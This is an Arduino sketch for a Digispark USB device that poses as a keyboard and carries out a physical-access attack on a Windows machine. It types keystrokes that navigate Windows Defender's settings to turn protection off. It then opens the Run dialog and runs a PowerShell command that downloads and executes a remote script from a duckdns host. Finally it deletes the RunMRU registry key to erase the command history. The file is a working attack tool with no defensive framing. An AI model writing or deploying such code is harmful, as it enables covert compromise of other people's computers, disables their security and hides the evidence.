#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  digitalWrite(1, HIGH);
  
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(500);                            //Open defender
  DigiKeyboard.sendKeyStroke(41, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("defender");
  
  DigiKeyboard.delay(300);                            //Go to settings
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(78);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(500);                            //disable defender
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(200);                          //close defender
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);



  DigiKeyboard.delay(500);                          //download payload // execute payload
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://hyred.duckdns.org/payloads/payload.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(500);                         //clear history
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f ");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {                                        //blink led
    digitalWrite(1, LOW);
    delay(100);
    digitalWrite(1, HIGH);
    delay(100);
  }
}
